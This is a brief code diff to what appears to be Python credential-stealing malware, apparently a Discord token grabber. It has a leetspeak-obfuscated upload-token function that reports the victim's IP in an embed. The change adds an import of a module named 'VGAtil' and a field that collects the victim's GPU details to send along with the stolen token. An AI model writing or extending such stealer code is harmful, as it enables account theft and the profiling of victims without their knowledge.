@@ -6,6 +6,7 @@ import shutil
 import ctypes
 import winreg
 import requests
+import VGAtil as GPU
 import urllib
 import random
 import warnings
@@ -476,6 +477,11 @@ def UP104D70K3N(token, path):
                 {
                     "name": "<a:blackworld:1095741984385290310> IP:",
                     "value": f"`{G371P()}`",
+                    "inline": True
+                },
+                {
+                    "name": "<a:blackworld:1095741984385290310> VGA:",
+                    "value": f"`{GPU.getGPUs()}`",
                     "inline": True
                 },
                 {
